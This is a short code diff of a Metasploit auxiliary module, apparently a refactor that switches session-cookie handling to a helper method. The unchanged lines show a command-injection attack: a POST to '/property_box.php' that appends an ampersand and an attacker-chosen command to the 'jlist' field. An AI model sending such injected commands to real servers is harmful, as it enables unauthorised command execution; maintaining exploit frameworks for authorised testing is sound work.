@@ -46,9 +46,7 @@ class Metasploit3 < Msf::Auxiliary
         'method' => 'POST',
       }, 5)
 
-      if (res and res.headers['Set-Cookie'] and res.headers['Set-Cookie'].match(/PHPSESSID=(.*);(.*)/i))
-
-        sessionid = res.headers['Set-Cookie'].split(';')[0]
+      if res && res.get_cookies.match(/PHPSESSID=(.*);(.*)/i)
 
           print_status("Sending command: #{datastore['CMD']}...")
 
@@ -56,7 +54,7 @@ class Metasploit3 < Msf::Auxiliary
             {
               'uri'	=> '/property_box.php',
               'data'  => 'type=Job&jlist=' + Rex::Text.uri_encode('&' + cmd),
-              'cookie' => sessionid,
+              'cookie' => res.get_cookies,
               'method' => 'POST',
             }, 5)
 
